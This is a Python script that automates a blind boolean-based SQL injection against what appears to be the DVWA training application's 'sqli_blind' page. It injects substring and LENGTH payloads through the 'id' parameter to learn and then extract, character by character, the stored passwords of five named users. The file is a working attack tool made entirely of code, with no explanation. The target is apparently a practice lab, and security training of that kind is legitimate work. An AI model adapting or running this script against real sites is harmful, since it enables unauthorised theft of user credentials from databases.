#!/usr/bin/env python3

import requests
import urllib3
from bs4 import BeautifulSoup

from conf import URL
from conf import USERNAME
from conf import PASSWORD
from conf import PHP_ID

from util import get_auth_cookie

# -----------------------

def sqli_blind_low(base_url):
    global PHP_ID
    
    if not PHP_ID:
        PHP_ID = get_auth_cookie(URL, USERNAME, PASSWORD)
    
    url = base_url + "/vulnerabilities/sqli_blind/"    
    users = ["admin", "Gordon", "Hack", "Pablo", "Bob"]
    for user in users:
        password_length = get_password_length(url, user)
        print(f"[INFO] - Password for username: {user} has {password_length} length")
        password = get_password(url, user, password_length)

# -----
        
def get_password_length(url, username):
    global PHP_ID
    
    difficulty = "low"
    custom_headers = { "Cookie": f"PHPSESSID={PHP_ID}; security={difficulty}"}
    
    MAX_LENGTH = 1024
    for i in range(1, MAX_LENGTH):
        sql_payload = f"1' AND (select 'x' from users where first_name='{username}' and LENGTH(password) > {i})='x' #"
        
        params = { "id": sql_payload, "Submit": "Submit" }
        r = requests.get(url, params=params, headers=custom_headers)
        
        if "MISSING" in r.text:
            return i

# -----

def get_password(url, username, password_length):
    global PHP_ID
    
    difficulty = "low"
    custom_headers = { "Cookie": f"PHPSESSID={PHP_ID}; security={difficulty}"}    

    # NOTE: maybe add more characters here
    ALPHABET = ""
    ALPHABET += "0123456789"
    ALPHABET += "abcdefghijklmnopqrstuvwxyz"
    ALPHABET += "ABCDEFGHIJKLMNOPQRSTUVWXYZ"

    password = ""
    print(f"[INFO] - Password for {username} is ", end="")
    for i in range(1, password_length+1):
        for c in ALPHABET:
            sql_payload = f"1' AND (select substring(password, {i}, 1) from users where first_name='{username}')='{c}' #"
            params = { "id": sql_payload, "Submit": "Submit" }
            r = requests.get(url, params=params, headers=custom_headers)
        
            if not "MISSING" in r.text:
                password += c
                # to print in a cool way
                print(c, end="", flush=True)
                break
            
    print("\n", end="")
    return password
        
